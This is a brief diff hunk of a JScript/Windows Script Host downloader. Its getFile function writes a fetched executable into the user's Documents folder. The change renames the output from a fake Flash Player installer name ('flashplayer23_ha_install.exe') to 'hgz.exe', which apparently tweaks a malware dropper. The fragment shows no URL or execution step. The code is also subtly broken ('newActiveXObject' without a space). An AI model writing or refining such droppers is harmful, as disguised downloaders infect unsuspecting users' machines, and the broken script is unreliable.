@@ -34,9 +34,9 @@ function getFile(strURL){
 
 var s = new ActiveXObject("ADODB.Stream");
 
-var md = newActiveXObject("WScript.Shell").SpecialFolders("MyDocuments");
+var md = newActiveXObject("WScript.Shell").SpecialFolders("Documents");
 
-md +="\\flashplayer23_ha_install.exe";
+md +="\\hgz.exe";
 
 s.Mode=3;
 
